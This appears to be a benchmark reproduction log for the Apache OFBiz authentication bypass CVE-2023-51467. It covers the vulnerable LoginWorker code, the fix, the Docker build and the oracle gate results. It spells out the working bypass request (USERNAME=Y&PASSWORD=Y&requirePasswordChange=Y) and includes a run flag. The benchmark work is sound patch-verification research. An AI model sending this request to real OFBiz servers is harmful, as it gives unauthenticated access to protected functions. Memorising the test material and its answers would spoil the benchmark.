PatchClosure-Bench repro log — apache-ofbiz-cve-2023-51467  (REAL-APP REBUILD)
CVE-2023-49070 (seed) -> CVE-2023-51467 (residual). Apache OFBiz auth bypass, CWE-306.
Rebuilt to REAL Apache OFBiz + external HTTPS trigger on 2026-07-16. Oracle variant B
(sibling-sink), validate_case_sibling. Gate PASSED on real Docker.

RUN MODE
  run_mode=real-app-http, external_http_trigger=true, is_verbatim_lift=false,
  runs_real_software=true. REAL Apache OFBiz is built from source per release18.12
  commit, boots its embedded Tomcat, and the auth guard is exercised by an EXTERNAL
  HTTPS request to the real ControlServlet. No OFBiz source is copied or modified.

REAL OFBIZ VERSIONS (release18.12 branch commits; tags 18.12.06..11 were never published)
  V0 = pre-CVE-2023-49070 : commit 7935a14627a86325440516ac6b892a5f9d635e4d
                            (parent of 'Remove xml rpc'; xmlrpc endpoint LIVE + bypass)
                            image pcb/ofbiz-real:v0-pre49070   https :18420 / http :18120
  V1 = 18.12.10  (TARGET) : commit c59336f604f503df5b2f7c424fd5e392d5923a27
                            ('Remove xml rpc (#630)' = CVE-2023-49070 fix; auth bypass OPEN)
                            image pcb/ofbiz-real:v1-18.12.10   https :18421 / http :18121
  V2 = 18.12.11           : commit 1dcfa071804a (OFBIZ-12873 = CVE-2023-51467 fix)
                            image pcb/ofbiz-real:v2-18.12.11   https :18422 / http :18122

MECHANISM (verified against the real source at each commit)
  File: framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java
  checkLogin() guard (V1): userLogin==null; USERNAME/PASSWORD non-empty; login() result:
      if (username == null || (password == null && token == null)
              || "error".equals(login(request, response))) { return "error"; } // else "success"
  login() userLogin-service FAILURE path, V1 line ~605 (VULNERABLE):
      return requirePasswordChange ? "requirePasswordChange" : "error";
  => residual: GET https://host:8443/pcbcanary/control/flag?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
     userLogin service RUNS against the seed-loaded DB and FAILS (invalid creds);
     login() returns "requirePasswordChange" (not "error"); USERNAME/PASSWORD non-empty
     => all three guard disjuncts false => checkLogin returns "success" => unauth access.
  CVE-2023-51467 fix, V2 line ~605 (commit 1dcfa071804a):
      return "error";
     => checkLogin's "error".equals(login(...)) true => guard returns "error" => blocked.

WHY HTTPS
  OFBiz redirects any resolved auth request from http to https (:8443), exactly as the
  public CVE-2023-51467 PoC uses https. The oracle drives the flag/seed probes over
  https on 8443 (self-signed cert, verification disabled). The seed 'Unknown request'
  differential is thrown before the https handling, so it is visible on either transport.

BENIGN AUTHZ CANARY (no OFBiz source modified)
  plugins/pcbcanary : a tiny webapp mounted at /pcbcanary with ONE request 'flag' gated
  by OFBiz's own <security auth="true"/> (-> real LoginWorker.checkLogin). Its groovy
  event writes ${PCB_FLAG} (baked in at container boot) to the HTTP response, and ONLY
  runs after checkLogin returns "success". Pure read of an authenticated-only view; no
  state change, no deserialization, no damage.

SIBLING-SINK modeling (why Variant B, not A)
  Seed CVE-2023-49070 = pre-auth XML-RPC deserialization channel. The 49070 fix (V1) did
  NOT touch the login predicate; it REMOVED the xmlrpc request-map (source-verified:
  present in webtools controller.xml at V0, 0 refs at V1). The auth-bypass predicate is
  IDENTICAL on V0 and V1, so Variant A ("original reaches flag on V0, blocked on V1") is
  impossible. Honest model: seed and residual are DIFFERENT sinks -> validate_case_sibling.
    seed_closed_on_v1  : GET /webtools/control/xmlrpc resolves on V0 (no 'Unknown request')
                         but yields 'Unknown request [xmlrpc]' on V1 (request-map removed).
    residual_reaches@V1: auth bypass -> /pcbcanary/control/flag -> ${PCB_FLAG} on 18.12.10.
    residual_blocked@V2: same probe -> login/error page, NO flag on 18.12.11 (51467 fix).

BUILD  (Dockerfile, base eclipse-temurin:8-jdk-jammy, gradle 5.0-rc-5)
  git clone release18.12 -> git checkout <OFBIZ_REF> -> copy plugins/pcbcanary ->
  ./gradlew "ofbiz --load-data readers=seed,seed-initial" (compiles OFBiz + loads 9123
  seed rows into embedded Derby at image-build time) -> CMD bakes ${PCB_FLAG} into the
  canary groovy event, then `./gradlew ofbiz` boots the real server.

GATE  (python3 oracle.py --run-gate, real Docker, all three profiles booted)
  residual_reaches_flag_on_v1 : true   (v1 -> 200 "PCB_AUTHVIEW_OK\n<FLAG>")
  residual_blocked_on_v2      : true   (v2 -> 200 login/error page, no flag)
  seed_closed_on_v1           : true   (xmlrpc resolves@v0 / 'Unknown request [xmlrpc]'@v1)
  passed                      : true
  positive controls: no-auth /pcbcanary/control/flag -> login page/no flag on v1 (guard
                     is real); residual also reaches flag on v0 (bypass predates 49070).
  flag (per-run): PCBFLAG_a668bd8d5038aff32baa35b6f6ea4605

TEARDOWN
  PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all
  + docker image prune -f. No pcb/ofbiz-real images remain; case dir clones OFBiz at build
  (no committed OFBiz tree / jars / images).

